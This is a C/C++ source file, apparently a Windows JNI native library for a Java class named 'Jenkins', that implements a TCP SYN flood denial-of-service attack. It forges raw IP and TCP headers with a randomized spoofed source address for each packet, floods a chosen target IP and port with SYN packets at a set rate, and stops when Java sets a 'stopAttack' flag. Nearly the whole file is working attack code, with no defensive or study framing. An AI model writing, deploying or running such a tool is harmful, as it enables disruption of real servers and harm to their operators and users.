#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <process.h>
#include <cstdint>

#pragma comment(lib, "ws2_32.lib")

#define PACKET_SIZE 40

// IP header structure
struct iphdr {
    uint8_t ihl:4, version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

// TCP header structure
struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};

struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
    struct tcphdr tcp;
};

struct thread_data {
    const char* target_ip;
    int target_port;
    int bytes_per_second;
    volatile bool* stop_attack;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return answer;
}

DWORD WINAPI send_syn_packets(LPVOID arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        printf("Error creating socket. Error number: %d\n", WSAGetLastError());
        return 1;
    }

    char datagram[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->target_port);
    sin.sin_addr.s_addr = inet_addr(data->target_ip);

    memset(datagram, 0, PACKET_SIZE);

    // IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->daddr = sin.sin_addr.s_addr;

    // TCP Header
    tcph->source = htons(1234);
    tcph->dest = htons(data->target_port);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (const char*)val, sizeof(one)) < 0) {
        printf("Error setting IP_HDRINCL. Error number: %d\n", WSAGetLastError());
        closesocket(s);
        return 1;
    }

    DWORD start_time = GetTickCount();
    long packets_sent = 0;
    long bytes_sent = 0;

    while (!(*(data->stop_attack))) {
        // Randomize source IP
        iph->saddr = htonl(rand());

        iph->check = csum((unsigned short *)datagram, iph->tot_len);

        // Calculate TCP checksum
        psh.source_address = iph->saddr;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
        tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));

        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("sendto() failed. Error number: %d\n", WSAGetLastError());
            continue;
        }

        packets_sent++;
        bytes_sent += PACKET_SIZE;

        if (packets_sent % 10000 == 0) {
            DWORD elapsed_time = (GetTickCount() - start_time) / 1000;
            double mbps = (bytes_sent * 8.0 / (1024 * 1024)) / (elapsed_time > 0 ? elapsed_time : 1);
            printf("Sent %ld SYN packets, %.2f MB, %.2f Mbps\n", packets_sent, bytes_sent / (1024.0 * 1024), mbps);
        }

        // Rate limiting
        if (bytes_sent >= data->bytes_per_second) {
            DWORD elapsed_time = GetTickCount() - start_time;
            if (elapsed_time < 1000) {
                Sleep(1000 - elapsed_time);
            }
            start_time = GetTickCount();
            bytes_sent = 0;
        }
    }

    closesocket(s);
    return 0;
}

JNIEXPORT void JNICALL Java_com_yourpackage_Jenkins_tcpSynFlood
  (JNIEnv *env, jobject obj, jstring targetIp, jint targetPort, jint bytesPerSecond) {
    printf("tcpSynFlood method called\n");
    const char *ip = env->GetStringUTFChars(targetIp, 0);
    struct thread_data data;
    data.target_ip = ip;
    data.target_port = targetPort;
    data.bytes_per_second = bytesPerSecond;
    volatile bool stop_attack = false;
    data.stop_attack = &stop_attack;

    HANDLE thread;
    thread = CreateThread(NULL, 0, send_syn_packets, (LPVOID)&data, 0, NULL);
    if (thread == NULL) {
        printf("Failed to create thread. Error: %d\n", GetLastError());
    } else {
        printf("Thread created successfully\n");
    }

    // Wait for Java to call stopAttack()
    jclass cls = env->GetObjectClass(obj);
    jfieldID fid = env->GetFieldID(cls, "stopAttack", "Z");
    while (!env->GetBooleanField(obj, fid)) {
        Sleep(100); // Sleep for 100ms
    }

    stop_attack = true;
    printf("Stop attack flag set to true\n");
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    printf("Thread closed\n");

    env->ReleaseStringUTFChars(targetIp, ip);
    printf("tcpSynFlood method completed\n");
}
